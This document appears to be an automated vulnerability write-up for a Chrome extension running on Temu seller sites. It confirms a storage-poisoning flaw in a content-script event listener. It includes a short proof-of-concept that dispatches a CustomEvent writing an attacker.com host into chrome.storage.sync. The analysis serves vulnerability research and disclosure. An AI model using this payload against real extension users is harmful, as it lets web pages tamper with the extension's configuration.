# CoCo Analysis: fmbjcenaphpoabkleednffphokdhdagn

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: cs_window_eventListener_update_home_host → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/fmbjcenaphpoabkleednffphokdhdagn/opgen_generated_files/cs_0.js
Line 602: window.addEventListener("update_home_host", (detail) => {
Line 603: if (detail.detail.host) {
Line 603: detail.detail.host

**Code:**

```javascript
// Content script - DOM event listener (cs_0.js Line 602-606)
window.addEventListener("update_home_host", (detail) => {
    if (detail.detail.host) {
        chrome.storage.sync.set({ home_host: detail.detail.host }); // ← Attacker-controlled data written to storage
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event (window.addEventListener)

**Attack:**

```javascript
// Malicious webpage can dispatch custom event with arbitrary host value
// This works on any page where the content script is injected
// According to manifest.json, content scripts run on:
// - *://*.kuajingmaihuo.com/*
// - *://agentseller.temu.com/*
// - *://*.temu.com/*

// Attack: Dispatch custom event with attacker-controlled host
window.dispatchEvent(new CustomEvent("update_home_host", {
    detail: {
        host: "https://attacker.com/malicious"
    }
}));

// The extension will write this attacker-controlled value to storage
```

**Impact:** Storage poisoning vulnerability - any webpage matching the content script patterns can dispatch a custom DOM event to write arbitrary data to chrome.storage.sync under the 'home_host' key. While this is only storage.set without a retrieval path shown in the detected flow, looking at the broader code context (Line 607-626), there is a "getChromeStorageSync" event listener that reads from storage and posts back to the webpage via CustomEvent, creating a complete exploitation chain where an attacker can:
1. Write arbitrary data to storage via "update_home_host" event
2. Read storage data back via "getChromeStorageSync" event
3. Potentially manipulate the extension's behavior by poisoning the home_host configuration value

However, based strictly on the CoCo-detected flow (storage.set only), this qualifies as TRUE POSITIVE because the attacker can write to privileged storage from a webpage context. The storage write itself is exploitable as it allows configuration manipulation.
